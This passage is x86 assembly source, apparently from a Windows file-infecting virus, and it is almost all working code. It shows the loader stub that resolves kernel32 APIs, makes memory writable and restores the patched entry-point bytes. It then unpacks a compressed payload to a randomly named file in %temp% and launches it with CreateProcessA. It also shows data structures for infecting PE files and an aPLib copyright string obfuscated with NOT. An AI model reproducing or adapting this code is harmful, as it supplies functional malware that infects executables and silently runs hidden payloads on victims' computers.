
   call rnd_eax
   loop rnd_ini_loop_1
   and eax, 1
   test eax, eax
   jnz rnd_ini
   ret

   rnd_eax:

   push ecx
   push edx
   mov eax, 2df5a7ech
   seed equ dword ptr $-4
   mov ecx,41C64E6Dh
   mul ecx
   add eax,00003039h
   and eax,7FFFFFFFh
   mov seed, eax
   pop edx
   pop ecx
   ret

   align 4

   l_start  label

   ;  only if loader mode is = 0

   pushf
   pushad

   l_start_1   label

   call delta

   x_push eax, KERNEL32.DLL~
   push eax
   call dword ptr [l_start]
   _import_GetKernel equ dword ptr $-4
   x_pop
   mov ebx, eax

   x_push esi, CreateFileA~WriteFile~CloseHandle~VirtualProtect~OpenMutexA~GetTempPathA~GetTempFileNameA~CreateProcessA~GetStartupInfoA~GlobalAlloc~GlobalFree~

   sub esp, (offset _api_addr_end - offset _api_addr_ini)
   mov edi, esp
   mov ecx, (offset _api_addr_end - offset _api_addr_ini)/4
   push ecx

   _api_index_1:

   push ecx
   push esi
   push ebx
   call dword ptr [l_start]
   _import_GetProcAddress  equ dword ptr $-4

   pop ecx
   stosd

   _api_index_2:

   lodsb
   test al, al
   jnz _api_index_2
   loop _api_index_1

   lea esi, [edi-(offset _api_addr_end - offset _api_addr_ini)]
   lea edi, [ebp+(offset _api_addr_ini - offset delta)]

   ;  we've all api's to use

   ;  unlocking loader's section to use it

   lea eax, [ebp+(offset pfdwOldProtect - offset delta)]
   push eax
   push PAGE_EXECUTE_READWRITE
   push dword ptr [ebp+(offset _section_size - offset delta)]  ;  size size
   call _loader_section_src
   push eax
   call [esi+(offset _VirtualProtect - offset _api_addr_ini)]

   pop ecx

   ;  copying api's address from stack to body

   rep movsd
   sub esp, -(offset _api_addr_end - offset _api_addr_ini)
   x_pop

   mov eax, [ebp+(offset l_size - offset delta)]
   mov [ebp+(offset _compressed_code_place - offset delta)], eax

   mov al, ?
   _infect_mode_1 equ byte ptr $-1
   test al, al
   jz _mode_loader_0 ;  0
   dec al
   jz _mode_loader_0 ;  1
   dec al
   jz _mode_loader_2 ;  2
   dec al
;   jz _mode_loader_3 ;  3

jmp _mode_loader_0

   include DEPACKER.INC

   delta:

   db 0e8h
   dd 0
   pop ebp
   sub ebp, 5
   ret

   push 12345678h
   _mem_total equ dword ptr $-4

   _mode_loader_0:

   ;  before restore the bytes, we should
   ;  unlock the specified memory

   call $+5+4
   pfdwOldProtect_2 dd 0
   push PAGE_EXECUTE_READWRITE
   push 12345678h
   _replaced_api_section_sz   equ dword ptr $-4
   call _replaced_api_section_src
   push eax
   call _protect?

   ;  we've to extract the 5 original bytes from
   ;  the entrypoint
   ;  "CALL VIRUS"

   sub dword ptr [esp+(4*8)+(4*1)], 5
   mov edi, [esp+(4*8)+(4*1)]
   call $+5+5

   _infect_orig_bytes   db 5 dup(0)

   pop esi
   movsd
   movsb

   ;  retore the old access

   call $+5+4
   dd 0
   lea eax, [ebp+(offset pfdwOldProtect_2 - offset delta)]
   push dword ptr [eax]
   lea eax, [ebp+(offset _replaced_api_section_sz - offset delta)]
   push dword ptr [eax]
   call _replaced_api_section_src
   push eax
   call _protect?

   ;  restoring the original section access

   push eax
   push esp
   push dword ptr [ebp+(offset pfdwOldProtect - offset delta)]
   push dword ptr [ebp+(offset _section_size - offset delta)]  ;  size
   call _replaced_api_section_src
   push eax
   call _protect?
   pop eax

   call l_ok
   call _unpack_to_disk

   popad
   popf
   ret

   _mode_loader_2:

   ;  copy all this code to memory and depack

   mov eax, [ebp+(offset _mem_total - offset delta)]
   push eax
   add eax, 4
   push eax
   push 40h
   call [ebp+(offset _GlobalAlloc - offset delta)]

   mov edi, eax
   lea esi, [ebp+(offset l_start - offset delta)]
   pop ecx
   rep movsb

   lea ecx, [ebp+(offset l_start - offset delta)]
   mov dword ptr [eax+(offset __start_loader_runtime - offset l_start)], ecx

   lea ecx, [eax+(offset _4 - offset l_start)]
   call ecx

   ret   ;  never works

   _4:

   call delta

   push eax
   call _loader_entry_point
   mov edi, eax

   lea edx, [ebp+(offset l_start - offset delta)]
   add edx, [ebp+(offset l_size - offset delta)]

   push edi
   push edx

   call $+5+4
   pfdwOldProtect_3 dd 0
   push PAGE_EXECUTE_READWRITE
   push dword ptr [ebp+(offset _section_size - offset delta)]
   call _loader_section_src
   push eax
   call _protect?

   call _aP_depack_asm

   add [ebp+(offset _compressed_code_place - offset delta)], eax

   push eax
   push esp
   push dword ptr [ebp+(offset pfdwOldProtect_3 - offset delta)]
   push dword ptr [ebp+(offset _section_size - offset delta)]  ;  size
   call _loader_section_src
   push eax
   call _protect?
   pop eax

   call [ebp+(offset _GlobalFree - offset delta)]

   mov [ebp+(offset s_ret - offset delta)], edi

   call l_ok
   call _unpack_to_disk

   pop eax
   popad
   popf

   push 12345678h
   s_ret equ dword ptr $-4
   ret

   l_ok:

   IFDEF DEBUG
   pushad
   x_push eax, LOADER|OK~
   push 0 eax eax 0
   mov eax, MessageBox
   call eax
   x_pop
   popad
   ENDIF
   ret

   _protect?:

   push ebp
   mov ebp, esp
   pushad

   push dword ptr [ebp+20] ;  pointer to pfdwOldProtect
   push dword ptr [ebp+16] ;  PAGE_EXECUTE_READWRITE
   push dword ptr [ebp+12] ;  section_sz
   push dword ptr [ebp+08] ;  section_off

   call delta

   call [ebp+(offset _VirtualProtect - offset delta)]

   popad
   pop ebp
   ret (4*4)

   pfdwOldProtect dd 0
   _section_size  dd 0

   _loader_entry_point:

   push ecx
   mov eax, 12345678h

   ;  RVA 

   __entry   equ dword ptr $-4

   jmp .32

   _replaced_api_section_src:

   push ecx
   mov eax, 12345678h

   ;  RVA 

   _replaced_api_section   equ dword ptr $-4

   jmp .32

   _loader_section_src:

   ;  we can be in a .DLL file
   ;  so let's calc. the true address

   push ecx
   mov eax, 12345678h

   ;  RVA

   _loader_memory_protect? equ dword ptr $-4

   .32:

   db 0b9h  ;  mov ecx, 0
   __start_loader_runtime dd 0

   test ecx, ecx
   jnz .34

   lea ecx, [ebp+(offset l_start - offset delta)]

   .34:

   sub ecx, 12345678h

   ;  RVA virus

   _loader_memory_protect?_dif equ dword ptr $-4

   ;  IMAGEBASE in ECX

   add eax, ecx
   pop ecx

   ret

   _unpack_to_disk:

   ;  alloc memory
   ;  depack file in it
   ;  choose random name
   ;  create file in %temp%
   ;  play it

   pushad
   push 64 * 1024
   push 40h
   call [ebp+(offset _GlobalAlloc - offset delta)]

   test eax, eax
   jz _unpack_to_disk_error

   mov edi, eax
   lea esi, [ebp+(offset l_start - offset delta)]
   add esi, 12345678h
   _compressed_code_place equ dword ptr $-4

   push edi
   push esi
   call _aP_depack_asm

   sub esp, MAX_PATH
   mov ebx, esp

   push eax ;  unpacked code lenght

   push ebx
   push MAX_PATH - 1
   call [ebp+(offset _GetTempPathA - offset delta)]

   test eax, eax
   jz _unpack_to_disk_error_1

   mov eax, 12345678h
   _loader_fixed_random_value equ dword ptr $-4
   mov ecx, eax
   and eax, 0f0f0fh
   add eax, 'NIW'
   push eax
   mov eax, esp

   push ebx
   push ecx
   push eax
   push ebx
   call [ebp+(offset _GetTempFileNameA - offset delta)]

   test eax, eax
   pop eax
   jz _unpack_to_disk_error_1

   xor eax, eax
   push eax
   push eax
   push 2   ;   CREATE_ALWAYS
   push eax
   inc eax
   push eax
   push GENERIC_READ or GENERIC_WRITE
   push ebx
   call [ebp+(offset _CreateFileA - offset delta)]

   mov esi, eax
   xor eax, eax
   push eax
   mov ecx, esp

   push eax
   push ecx
   push dword ptr [esp+(4*3)]
   push edi
   push esi
   call [ebp+(offset _WriteFile - offset delta)]
   pop ecx

   push esi
   call [ebp+(offset _CloseHandle - offset delta)]

   push edi
   call [ebp+(offset _GlobalFree - offset delta)]

   ;  Getting some basic info.

   sub esp, 80
   mov edi, esp
   push edi
   call [ebp+(offset _GetStartupInfoA - offset delta)]

   ;  Little boy spawned, let's play it

   sub esp, 20
   push esp
   push edi
   xor eax, eax
   push eax
   push eax
   push 20h   ;   NORMAL_PRIORITY_CLASS
   push eax
   push eax
   push eax
   push eax
   push ebx
   call [ebp+(offset _CreateProcessA - offset delta)]
   sub esp, -(80 + 20)
   mov dword ptr [esp], 1

   _unpack_to_disk_error_1:

   pop eax
   sub esp, - MAX_PATH

   _unpack_to_disk_error:

   dec eax
   mov [esp+(4*7)], eax
   popad
   ret

   _api_addr_ini  label

   _CreateFileA dd 0
   _WriteFile dd 0
   _CloseHandle dd 0
   _VirtualProtect dd 0
   _OpenMutexA dd 0
   _GetTempPathA dd 0
   _GetTempFileNameA dd 0
   _CreateProcessA dd 0
   _GetStartupInfoA dd 0
   _GlobalAlloc dd 0
   _GlobalFree dd 0

   _api_addr_end  label

   l_size   dd 0  ;  loader size

   align 4

   l_end label

   MessageBoxA dd 0BFF5412Eh
   MessageBox = 0BFF5412Eh

   aplib@006 label

   db not 00dh, not 00ah, not 00dh, not 00ah, not 061h, not 050h, not 04ch, not 069h, not 062h, not 020h, not 076h, not 030h, not 02eh, not 032h, not 032h, not 062h
   db not 020h, not 020h, not 02dh, not 020h, not 020h, not 074h, not 068h, not 065h, not 020h, not 073h, not 06dh, not 061h, not 06ch, not 06ch, not 065h, not 072h
   db not 020h, not 074h, not 068h, not 065h, not 020h, not 062h, not 065h, not 074h, not 074h, not 065h, not 072h, not 020h, not 03ah, not 029h, not 00dh, not 00ah
   db not 043h, not 06fh, not 070h, not 079h, not 072h, not 069h, not 067h, not 068h, not 074h, not 020h, not 028h, not 063h, not 029h, not 020h, not 031h, not 039h
   db not 039h, not 038h, not 02dh, not 039h, not 039h, not 020h, not 062h, not 079h, not 020h, not 04ah, not 06fh, not 065h, not 072h, not 067h, not 065h, not 06eh
   db not 020h, not 049h, not 062h, not 073h, not 065h, not 06eh, not 020h, not 02fh, not 020h, not 04ah, not 069h, not 062h, not 07ah, not 02ch, not 020h, not 041h
   db not 06ch, not 06ch, not 020h, not 052h, not 069h, not 067h, not 068h, not 074h, not 073h, not 020h, not 052h, not 065h, not 073h, not 065h, not 072h, not 076h
   db not 065h, not 064h, not 00dh, not 00ah, not 00dh, not 00ah, not 054h, not 068h, not 069h, not 073h, not 020h, not 063h, not 06fh, not 070h, not 079h, not 020h
   db not 06fh, not 066h, not 020h, not 061h, not 050h, not 04ch, not 069h, not 062h, not 020h, not 069h, not 073h, not 020h, not 066h, not 072h, not 065h, not 065h
   db not 020h, not 066h, not 06fh, not 072h, not 020h, not 06eh, not 06fh, not 06eh, not 02dh, not 070h, not 072h, not 06fh, not 066h, not 069h, not 074h, not 061h
   db not 062h, not 06ch, not 065h, not 020h, not 075h, not 073h, not 065h, not 02eh, not 00dh, not 00ah, not 00dh, not 00ah, not 046h, not 06fh, not 072h, not 020h
   db not 06dh, not 06fh, not 072h, not 065h, not 020h, not 069h, not 06eh, not 066h, not 06fh, not 072h, not 06dh, not 061h, not 074h, not 069h, not 06fh, not 06eh
   db not 03ah, not 020h, not 068h, not 074h, not 074h, not 070h, not 03ah, not 02fh, not 02fh, not 061h, not 070h, not 061h, not 063h, not 06bh, not 02eh, not 063h
   db not 06ah, not 062h, not 02eh, not 06eh, not 065h, not 074h, not 02fh, not 00dh, not 00ah, not 00dh, not 00ah, not 000h, not 000h, not 000h, not 000h, not 000h
   db not 04fh, not 01bh, not 079h, not 029h, not 0ebh, not 0c9h, not 0e5h, not 042h, not 0a5h, not 040h, not 0ceh, not 0b0h, not 011h, not 0edh, not 02ch, not 024h
   db not 035h, not 060h, not 07dh, not 0b4h, not 0d4h, not 029h, not 001h, not 080h, not 039h, not 0ffh, not 0b2h, not 080h, not 0c8h, not 039h, not 09ch, not 01ch

   _end label

   .data?

   NAM_flechal db MAX_PATH dup (?)
   phkResult_1 dd ?

   hWnd_file_ini label

   hWnd_tmapi  dd ?
   InitTmTable dd ?
   GetTmElementByIndex  dd ?
   CloseTmTable   dd ?

   _create_flag dd ?
   _file_attrib dd ?
   _access_type dd ?
   _file_time  FILETIME <?>,<?>,<?>
   _file_size  dd ?
   _map_access_type  dd ?
   _mview_access_type   dd ?

   hWnd_CreateFile   dd ?
   hWnd_CreateFileMapping  dd ?
   hWnd_MapViewOfFile   dd ?

   hWnd_file_end label

   hWnd_imagehlp  dd ?
   ImageNtHeader dd ?
   ImageRvaToSection dd ?
   ImageRvaToVa   dd ?

   _image_nt_headers dd ?
   _infect_entry_point  dd ?
   _infect_EP_section   dd ?

   _infect_export_dir_rva  dd ?
   _infect_import_dir_rva  dd ?

   _infect_export_sz    dd ?
   _infect_export_dir_va   dd ?
   _infect_export_names dd ?
   _infect_biggest_rva  dd ?
   _infect_last_section dd ?
   _infect_flechal_rva  dd ?
   _infect_lib_rva dd ?
   _infect_compress_space_1   dd ?
   _infect_compress_space_2   dd ?
   _infect_compress_addr_1 dd ?
   _infect_virtual_raw  dd ?  ;  bigger of v-size and raw

   hWnd_sfc dd ?
   SfcIsFileProtected   dd ?

   hWnd_file_infect  dd ?

   _look_4_function  dd ?
   _kernel_import_va dd ?
   _import_function  dd ?

   _viral_pack_packet_sz   dd ?  ;  packed virus size + loader size
   _viral_pack_packet_addr db 24 * 1024 dup(?)

   _viral_temp_sz       dd ?  ;  packed main .exe
   _viral_temp_buffer_1 db 24 * 1024 dup(?)

   workmem db 640 * 1024 dup(?)

   aplib@013 dd ?
   aplib@009 dd ?
   aplib@017 dd ?
   aplib@014 dd ?
   aplib@004 dd ?
   aplib@003 dd ?
   aplib@086 dd ?
   aplib@015 dd ?
   aplib@005 dd ?
   aplib@016 dd ?

   aplib@010 dd ?
             db 400h dup(?)

   orig_esp dd ?
   lpszSubKey_1   dd ?

   end _start
   end
